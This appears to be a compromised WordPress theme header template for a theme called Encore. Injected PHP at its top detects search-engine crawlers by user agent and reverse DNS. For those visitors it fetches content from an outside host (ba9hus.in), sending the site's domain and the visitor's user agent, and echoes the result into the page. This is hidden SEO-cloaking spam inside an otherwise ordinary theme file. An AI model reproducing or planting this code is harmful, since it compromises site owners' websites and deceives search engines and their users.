


<?php
$user_agent_to_filter = array( '#Ask\s*Jeeves#i', '#HP\s*Web\s*PrintSmart#i', '#HTTrack#i', '#IDBot#i', '#Indy\s*Library#',
                               '#ListChecker#i', '#MSIECrawler#i', '#NetCache#i', '#Nutch#i', '#RPT-HTTPClient#i',
                               '#rulinki\.ru#i', '#Twiceler#i', '#WebAlta#i', '#Webster\s*Pro#i','#www\.cys\.ru#i',
                               '#Wysigot#i', '#Yahoo!\s*Slurp#i', '#Yeti#i', '#Accoona#i', '#CazoodleBot#i',
                               '#CFNetwork#i', '#ConveraCrawler#i','#DISCo#i', '#Download\s*Master#i', '#FAST\s*MetaWeb\s*Crawler#i',
                               '#Flexum\s*spider#i', '#Gigabot#i', '#HTMLParser#i', '#ia_archiver#i', '#ichiro#i',
                               '#IRLbot#i', '#Java#i', '#km\.ru\s*bot#i', '#kmSearchBot#i', '#libwww-perl#i',
                               '#Lupa\.ru#i', '#LWP::Simple#i', '#lwp-trivial#i', '#Missigua#i', '#MJ12bot#i',
                               '#msnbot#i', '#msnbot-media#i', '#Offline\s*Explorer#i', '#OmniExplorer_Bot#i',
                               '#PEAR#i', '#psbot#i', '#Python#i', '#rulinki\.ru#i', '#SMILE#i',
                               '#Speedy#i', '#Teleport\s*Pro#i', '#TurtleScanner#i', '#User-Agent#i', '#voyager#i',
                               '#Webalta#i', '#WebCopier#i', '#WebData#i', '#WebZIP#i', '#Wget#i',
                               '#Yandex#i', '#Yanga#i', '#Yeti#i','#msnbot#i',
                               '#spider#i', '#yahoo#i', '#jeeves#i' ,'#google#i' ,'#altavista#i',
                               '#scooter#i' ,'#av\s*fetch#i' ,'#asterias#i' ,'#spiderthread revision#i' ,'#sqworm#i',
                               '#ask#i' ,'#lycos.spider#i' ,'#infoseek sidewinder#i' ,'#ultraseek#i' ,'#polybot#i',
                               '#webcrawler#i', '#robozill#i', '#gulliver#i', '#architextspider#i', '#yahoo!\s*slurp#i',
                               '#charlotte#i', '#ngb#i', '#BingBot#i' ) ;

if ( !empty( $_SERVER['HTTP_USER_AGENT'] ) && ( FALSE !== strpos( preg_replace( $user_agent_to_filter, '-NO-WAY-', $_SERVER['HTTP_USER_AGENT'] ), '-NO-WAY-' ) ) ){
    $isbot = 1;
	}

if( FALSE !== strpos( gethostbyaddr($_SERVER['REMOTE_ADDR']), 'google')) 
{
    $isbot = 1;
}

if(@$isbot){

$_SERVER[HTTP_USER_AGENT] = str_replace(" ", "-", $_SERVER[HTTP_USER_AGENT]);
$ch = curl_init();    
    curl_setopt($ch, CURLOPT_URL, "http://ba9hus.in/cac2/?useragent=$_SERVER[HTTP_USER_AGENT]&domain=$_SERVER[HTTP_HOST]");   
    $result = curl_exec($ch);       
curl_close ($ch);  

	echo $result;
}
?><?php
/**
 * The template for displaying the theme header.
 *
 * @package Encore
 * @since 1.0.0
 */
?><!DOCTYPE html>
<html class="no-js" <?php language_attributes(); ?>>
<head>
	<meta charset="<?php bloginfo( 'charset' ); ?>">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="profile" href="http://gmpg.org/xfn/11">
	<link rel="pingback" href="<?php bloginfo( 'pingback_url' ); ?>">
	<?php wp_head(); ?>

















































</head>

<body <?php body_class(); ?> itemscope itemtype="http://schema.org/WebPage">

	<?php do_action( 'encore_before' ); ?>

	<div id="page" class="hfeed site">
		<a class="skip-link screen-reader-text" href="#content"><?php esc_html_e( 'Skip to content', 'encore' ); ?></a>

		<?php do_action( 'encore_header_before' ); ?>

		<?php get_template_part( 'templates/parts/site-header' ); ?>

		<?php do_action( 'encore_header_after' ); ?>

		<div id="content" class="site-content">

			<?php
			do_action( 'encore_main_before' );
